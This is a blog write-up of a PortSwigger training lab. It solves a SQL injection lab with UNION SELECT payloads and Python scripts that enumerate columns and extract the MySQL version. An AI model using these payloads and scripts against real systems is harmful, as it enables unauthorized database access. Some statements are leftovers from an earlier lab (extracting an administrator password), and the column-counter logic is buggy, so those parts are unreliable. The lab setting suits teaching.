+++
title = "SQLi Vulnerabilities: Lab 7: SQL injection attack, querying the database type and version on MySQL and Microsoft"
date = 2025-11-14
lastmod = 2025-11-14
draft = false
author = "bloodstiller"
description = "PortSwigger sqli lab write-up using a UNION Attack to enumerate a MySQL/MSSQL Version number using python and burpsuite" 
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "portswigger-labs",
  "ctf-writeup",
  "injection",
  "sql",
  "sqli",
  "python",
  "UNION"
]
keywords = [
  "authentication vulnerabilities",
  "SQL",
  "SQLi",
  "PortSwigger authentication lab",
  "web security"
]
toc = true
bold = true
next = true
+++

## Lab 7: SQL injection attack, querying the database type and version on MySQL and Microsoft: {#lab-7-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft}

> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
> To solve the lab, display the database version string.


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

We are given access to a simple web application which allows us to filter categories of products using the filters on the page, there is also a "Home" button.

{{< figure src="/ox-hugo/2025-11-14_11-20.png" >}}

We already know the "category" parameter is vulnerable based on the previous lab however let's re-verify this.
~~Note~~: We can also see the string it wants us to display, this is useful as we can already infer it's not running MSSQL but instead MySQL as the host is ubuntu &amp; we can use this partial string to help with our python scripting later.


### Establishing SQLi: {#establishing-sqli}

If we send request to repeater we can inject a single quote `'` after the parameter and see we trigger a `500` response.
![](/ox-hugo/2025-11-14_11-22.png)

If then add a single another quote we can see that the page returns a `200` OK response.
![](/ox-hugo/2025-11-14_11-22_1.png)


### Inferring The SQL Query Being Run: {#inferring-the-sql-query-being-run}

Looking at the way the page we can infer the query being run is similar to the below.

```sql
SELECT * FROM products WHERE category = 'Pets' AND [rest of query]
```

When we add our single quote it becomes the below which is syntactically incorrect.

```sql
SELECT * FROM products WHERE category = 'Pets'' AND [rest of query]
```

However when we add another quote it becomes the below, closing off the first quotation mark we provided.

```sql
SELECT * FROM products WHERE category = 'Pets''' AND [rest of query]
```


### UNION SELECT Requirements: {#union-select-requirements}

As the lab wants us to display data we will need a way to output that data and the simplest way to retrieve data would be using a `UNION SELECT` query so we can display the query string in amongst the legitimate data that is being displayed. However in order for us to do this we need to ensure that the two requirements for this attack are met:

1.  **The queries must return the same amount of columns**:
    This means that if the original query that is searching the database returns 5 columns our `UNION` query must also return 5 columns.
    -   **To solve this issue**: We will enumerate the number of columns being returned by the original query.

2.  **The data types in the columns must be compatible with each query**:
    This means that if the table is returning strings such as item names in column 1 our `UNION` query has to also return strings or a compatible data type.
    -   **To solve this issue**: Initially we will use a simple method of returning `NULL` values. This is because `NULL` is convertible/compatible to every data type, so it will mean that the payload should succeed. Once we have established our column count we will then start enumerating the data type of the columns &amp; eventually extract data.


### Establishing The Number Of Columns Using UNION SELECT Statement: {#establishing-the-number-of-columns-using-union-select-statement}


#### Using Burp: {#using-burp}

In order for us to display data we need to establish how many columns are in the existing database.

If we return back to repeater we can enter the payload.

```sql
' UNION SELECT NULL--
```

{{< figure src="/ox-hugo/2025-11-14_11-26.png" >}}

We then select the payload &amp; press `CTRL+U` to URL encode it, however this won't work. The reason being is that this is database is running MySQL and MySQL comments ~~require~~ a space after the comment symbol. So we need to add an additional space so by using a `+` symbol or we can just use the `#` symbol instead.
![](/ox-hugo/2025-11-14_12-09.png)

If we send this payload we get a `500` response meaning the number of columns is not correct, so add another `NULL` so our payload and repeat the process.

```sql
' UNION SELECT NULL,NULL--
```

This time we get a `200` response telling us there are 2 columns in the table.
![](/ox-hugo/2025-11-14_12-11.png)


#### Using Python: {#using-python}

As usual I am going to show how this can also be solved using Python.


##### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


##### Imports: {#imports}

First we import the modules we will need, `requests` &amp; `os`. We also suppress the `requests` warning that will show.

```python
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
```

If we didn't suppress the warnings the output would look like this.
![](/ox-hugo/2025-11-06_06-02.png)


##### Proxy Setup: {#proxy-setup}

Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

```python
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
```


##### Variable Declaration: {#variable-declaration}

<!--list-separator-->

-  Proxies &amp; URL:

    We declare an array of proxies to proxy our requests through as well as the unique url &amp; category endpoint.
    ~~Note~~: The category and URL vary from instance to instance.

    ```python
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    url="https://0aa9007a0350e042804fee0b002f0021.web-security-academy.net/filter?category=Gifts"
    ```

<!--list-separator-->

-  SQL Syntax &amp; Counters:

    So now we have our payload broken up into various elements, the reason for this is because we don't want to just supply a list of multiple `UNION SELECT` statements, doing it this way offers more flexibility as well as ensuring we don't repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn't advise that but you could)

    ```python
    union="' UNION SELECT "
    comma=","
    nullPayload="NULL"
    comment="--"
    additionalNull=comma+nullPayload
    payload=union+nullPayload
    counter=2
    ```

    We also create a `counter` variable and set it to `2`. This `counter` is used to track how many `NULL` values (columns) are in our `UNION SELECT` payload as we build it. Our starting payload is:

    ```python
    payload = union + nullPayload # "' UNION SELECT NULL"
    ```

    So before the loop runs we already have one `NULL` in the query. Inside the loop, we keep appending more `,NULL` values to `payload` and update `counter` to reflect the number of columns.

    We don’t start the `counter` at `0` because SQL columns are conceptually counted from 1 (first column, second column etc&#x2026;) and our payload already includes the first `NULL` column. If we started from 0, the value of `counter` would always lag behind the actual number of `NULL` columns in the query. By starting at `2`, the value of `counter` stays aligned with the true column count once we begin adding additional `NULL` values in the loop.


##### For Loop With Request: {#for-loop-with-request}

We declare a for loop will which repeat for 10 total iterations.

Then we have a `try` block which will send our get request to the `url` with `payload` &amp; `comment`.

**Response Monitoring**: We then monitor the responses and if the value "Home" is found in the body of the response we will:

-   Print the string `"Valid payload {payload}-- there are {counter} columns."` which will contain the actual payload as well as the number of columns.
-   Print the full Lab URL including comment and payload so we can easily verify it in a browser.

If these above conditions are met it will `break` out of the loop and stop the process.

If the above is not found it will add an additional `NULL` value using the `additionalNull` variable to the payload &amp; increment the `counter` by `1` and continue.

```python
for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'Home' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
           break
        payload=payload+additionalNull
        counter+=i
```


##### Error Handling: {#error-handling}

These `except` clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.

```python
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Full Script: {#full-script}

```python
#!/usr/bin/env python3
import requests
import os
import urllib.parse
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url="https://0a5e008204fb807d80bf7bf20046003e.web-security-academy.net/filter?category=Pets"

union="' UNION SELECT "
comma=","
nullPayload="NULL"
comment="-- "
additionalNull=comma+nullPayload
payload=union+nullPayload
counter=2

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'Home' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
        payload=payload+additionalNull
        counter+=i

    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Running The Script: {#running-the-script}

As we can see it tells what we expect, there are 2 columns and the correction payload is:

```sql
' UNION SELECT NULL,NULL--
```

{{< figure src="/ox-hugo/2025-11-14_12-30.png" >}}


### Establishing Column Data Type VIA UNION SELECT Statement: {#establishing-column-data-type-via-union-select-statement}


#### Using Burp: {#using-burp}

Much like how we established the number of columns we can use repeater to determine the column data type.

We know to pass the lab we need to extract the administrators username &amp; password in a single column, then login. Typically usernames and passwords would be a string data type in the database. So to enumerate this we will systematically start replacing the `NULL` values of our payload with the string values `'a'`. This means our payload becomes:

```sql
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--
'+UNION+SELECT+'a','a'--
```

As we can the first column is compatible with the string datatype as we get a `200` response.
![](/ox-hugo/2025-11-14_12-32.png)

We now modify our payload so the string value is in the second `NULL` position and revert the first position to be `NULL` again.

```sql
'+UNION+SELECT+NULL,'a'--
```

We can see this worked and the second position is also compatible with the string datatype.
![](/ox-hugo/2025-11-14_12-33.png)


#### Using Python: {#using-python}

We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we have added.

```diff
+compatible=0

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'Home' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
+          payloadList=[nullPayload] * counter
+          for y in range(len(payloadList)):
+              if payloadList[y] == "NULL":
+                  payloadList[y] = "'string'"
+                  newPayload=(",".join(payloadList))
+                  request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
+                  if 'Home' in request.text:
+                      print(f"Compatible data type found {union+newPayload+comment}")
+                      compatible+=1
+                      if compatible > 1:
+                          print(f"{compatible} compatible data type columns found, suggest combining payloads")
+                  payloadList[y] = "NULL"

        payload=payload+additionalNull
        counter+=i
```

**Compatible Variable**:
This is going to be used later on to print out a specific message if we find more than 1 compatible data type column so at the moment we set this with a value of `0`.

```python
compatible=0
```

**List Creation**:
We then create a `payloadList` that's contents is the value of `nullPayload` (which is "NULL") and this is equal to the value of the counter so if the counter is 2 then the list value is `['NULL', 'NULL']`

```python
payloadList=[nullPayload] * counter
```

**List Iteration**:

```python
if payloadList[y] == "NULL":
   payloadList[y] = "'string'"
```

We now iterate through the length of the list and if the value of `y` in the list is equal to `NULL` (which it will be) we replace that with the with a string called string. So on the first run it would `['string', NULL]`.

**New Payload Creation**:

```python
newPayload=(",".join(payloadList))
```

We then join our list together into a string so we can pass this to our request later, and we ensure we separate  with a comma `,` other wise our payload would be `"'string'NULLNULL"`

**Send our Request**:

```python
request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
if 'Home' in request.text:
    print(f"Compatible data type found {union+newPayload+comment}")
```

Next we send our request like before but this time we are using our new payload. We also need to ensure we send the `"union"` variable as this is not currently present in our list/string/payloadstring.

We also perform the same type of check in the body of the request for the string "Home" which will signify that we have had a `200` OK response, and in this event it will print out the payload.

**Compatible Logic Counter**:
If the above conditions are met we increment our compatible counter by `1`. We then perform a check if the counter is greater than `1` and if it is we print out the total number of compatible data types found and suggest the user combine the payloads.

```python
compatible+=1
if compatible > 1:
    print(f"{compatible} compatible data type columns found, suggest combining payloads")
```

**Reset The `NULL` Value**:

```python
payloadList[y] = "NULL"
```

In the event that we do not get a `200` response we rest the list position `y` to be `NULL` again as other wise the list would just be full of the lab string.

As we can see when we run the script it prints out the compatible data type fields in position 1 &amp; 2 and also suggests we combine the payloads as they are both valid.
![](/ox-hugo/2025-11-14_12-37.png)


### Extracting The Database Version By Using A UNION SELECT Statement: {#extracting-the-database-version-by-using-a-union-select-statement}

We can easily query the database version using the correct the below query.

```sql
' UNION SELECT NULL,@@version--
```


#### Using Burp: {#using-burp}

Let's use the above query in burpsuite to extract the database version.

We can see this works and the version is displayed.
![](/ox-hugo/2025-11-14_12-45.png)

If we visit the page we can see the lab is solved.
![](/ox-hugo/2025-11-14_12-46.png)


#### Using Python: {#using-python}

We can also use python to extract the database version directly too.

**Additional Import**:
For us to parse and extract the database version we need the `BeautifulSoup` library and as we will be using regular expressions we need the `re` library.

```python
from bs4 import BeautifulSoup
import re
```

```python
def extractSQLVersion():
    sqlPayload="' UNION SELECT NULL,@@version-- "
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "Home" in response:
        soup = BeautifulSoup(request.text, 'html.parser')
        SQLVersion = soup.find('td', string=re.compile(r'^8\.0\.42'))
        print(f"The SQLVersion is: {SQLVersion}")
        return True
    return False
```

**Function definition &amp; payload**
First we define the function called `extractSQLVersion` we then declare our `sqlPayload`.

```python
def extractSQLVersion():
    sqlPayload="' UNION SELECT NULL,@@version-- "
```

**Send a request &amp; store the response**:
We send our payload and store the response in a variable called `response`.

```python
request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
response=request.text
```

**Parse response**:

```python
    if "Home" in response:
        soup = BeautifulSoup(request.text, 'html.parser')
        SQLVersion = soup.find('td', string=re.compile(r'^8\.0\.42'))
        print(f"The SQLVersion is: {SQLVersion}")
        return True
    return False
```

If we find the string "home" in the response this tells us the table of users has been returned.

We pass the HTML body from the HTTP response into beautiful soups HTML parser so it can turn the raw HTML into a structured object we can search through.

We then search through this HTML, namely within the `td` tags for the regular expression string `"^8\.0\.42"` (the version number). We search within the `td` as this is where the string is stored.
![](/ox-hugo/2025-11-14_15-04.png)

**Call the Function**:
We now call the function so it runs after our other conditions are satisfied.

```diff
  if 'Home' in request.text:
      print(f"Compatible data type found {union+newPayload+comment}")
      compatible+=1
+      if compatible > 1:
          print(f"{compatible} compatible data type columns found, suggest combining payloads")
+         extractSQLVersion()
  payloadList[y] = "NULL"
```

As we can see it works when we run it and we are given the administrators password.
![](/ox-hugo/2025-11-14_15-06.png)


#### Whole Script: {#whole-script}

```python
#!/usr/bin/env python3
import requests
import os
import urllib.parse
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url="https://0a9200ae04e705ff80121ceb00cf0094.web-security-academy.net/filter?category=Lifestyle"

union="' UNION SELECT "
comma=","
nullPayload="NULL"
comment="-- "
additionalNull=comma+nullPayload
payload=union+nullPayload
counter=2
compatible=0

def extractSQLVersion():
    sqlPayload="' UNION SELECT NULL,@@version-- "
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "Home" in response:
        soup = BeautifulSoup(request.text, 'html.parser')
        SQLVersion = soup.find('td', string=re.compile(r'^8\.0\.42'))
        print(f"The SQLVersion is: {SQLVersion}")
        return True
    return False

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'Home' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
           payloadList=[nullPayload] * counter
           for y in range(len(payloadList)):
               if payloadList[y] == "NULL":
                   payloadList[y] = "'string'"
                   newPayload=(",".join(payloadList))
                   request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
                   if 'Home' in request.text:
                       print(f"Compatible data type found {union+newPayload+comment}")
                       compatible+=1
                       if compatible > 1:
                           print(f"{compatible} compatible data type columns found, suggest combining payloads")
                           extractSQLVersion()
                   payloadList[y] = "NULL"

        payload=payload+additionalNull
        counter+=i

    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```
